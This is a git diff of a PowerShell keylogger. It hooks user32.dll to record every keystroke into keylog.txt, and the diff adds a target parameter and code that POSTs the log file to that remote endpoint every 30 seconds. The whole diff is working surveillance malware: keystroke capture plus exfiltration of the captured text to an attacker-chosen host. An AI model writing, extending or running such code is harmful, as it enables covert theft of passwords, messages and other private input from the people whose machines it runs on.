@@ -14,8 +14,10 @@ Console and CSV files locally
 	[Required] Full address and location of the POST endpoint you want to target
 
 #> 
+Param([string]$target)
 
 #Note that this was primarily built off of an example found online.
+#https://www.nextofwindows.com/creating-a-simple-keylogger-using-powershell-download
 $user32 = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
@@ -42,7 +44,7 @@ while ($true) {
 
 	# get all ASCII standard Roman characters
 	for ($char = 9; $char -le 254; $char++) {
-                $caps_lock = [console]::CapsLock
+		$caps_lock = [console]::CapsLock
 		$keystate = $api::GetAsyncKeyState($char)
 		if ($keystate -eq -32767) {
 			$null = [console]::CapsLock
@@ -62,6 +64,11 @@ while ($true) {
 			if ($success) {
 				Write-Host $mychar
 				Out-File -FilePath "keylog.txt" -Encoding Unicode -Append -InputObject $mychar.ToString()
+			}
+			#https://stackoverflow.com/questions/22491129/how-to-send-multipart-form-data-with-powershell-invoke-restmethod
+			if ($Stopwatch.Elapsed.Seconds%30 -eq 0) {
+				Write-Host "Sending keylog..."
+				Invoke-WebRequest -Uri $target -Method POST -InFile "keylog.txt"
 			}
 		}
 	}
